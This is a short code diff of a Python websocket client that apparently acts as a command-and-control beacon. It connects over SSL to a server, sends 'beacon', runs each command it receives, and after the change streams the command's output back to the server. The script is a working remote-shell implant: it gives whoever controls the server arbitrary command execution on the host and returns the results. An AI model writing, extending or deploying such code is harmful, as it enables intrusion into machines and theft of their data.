@@ -1,4 +1,4 @@
-import socket
+import subprocess
 import ssl
 import websockets
 import asyncio
@@ -32,10 +32,15 @@ async def hello():
         uri, ssl=sslSettings
         ) as websocket:
                 print("Connected")
-                msg = '{"Name":"beacon"}'
+                msg = "beacon"
                 while 1:
                         await websocket.send(msg)
                         cmd = await websocket.recv()
-                        os.system(cmd)
+                        with subprocess.Popen([cmd],stdout=subprocess.PIPE,bufsize=1,universal_newlines=True) as process:
+                                for line in process.stdout:
+                                        line = line.rstrip()
+                                        print(f"line = {line}")
+                                        await websocket.send(line)
+                        #os.system(cmd)
 
 asyncio.get_event_loop().run_until_complete(hello())
